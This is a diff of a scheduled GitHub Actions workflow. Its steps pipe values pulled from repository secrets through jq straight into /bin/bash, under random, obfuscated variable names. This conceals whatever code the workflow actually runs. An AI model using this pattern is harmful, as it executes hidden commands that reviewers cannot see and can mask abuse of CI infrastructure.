@@ -3,20 +3,25 @@ name: jinghongxz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 3/6 * * *'
-jobs:  # 4429
+    - cron: '14 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jinghongxz
         env:
-          bki20: ${{ secrets.bki20 }}
+          ny72: ${{ secrets.ny72 }}
         run: |
-          echo $bki20 | jq -r .lpxbq74 | /bin/bash
-          echo $znv1559 | jq -r .h0378 | /bin/bash
-          echo $a5348 | jq -r .wenl28 | /bin/bash
-          echo $wpmc9 | jq -r .nhxy15 | /bin/bash
-          echo $cg552 | jq -r .o78 | /bin/bash
-          echo $rajx530 | jq -r .cre49 | /bin/bash
+          echo $ny72 | jq -r .hlv3 | /bin/bash
+          echo $o575 | jq -r .w64636 | /bin/bash
+          echo $ik0 | jq -r .e5763 | /bin/bash
+          echo $dhaz3 | jq -r .da6690 | /bin/bash
+          echo $mkn396 | jq -r .i24697 | /bin/bash
+          echo $wbkme13291 | jq -r .hzg658 | /bin/bash
+          echo $hfhd5 | jq -r .hkwz9466 | /bin/bash
+          echo $l7 | jq -r .dgpi64822 | /bin/bash
+          echo $x1157 | jq -r .z2460 | /bin/bash
+          echo $jgj5 | jq -r .nlerk5890 | /bin/bash
 
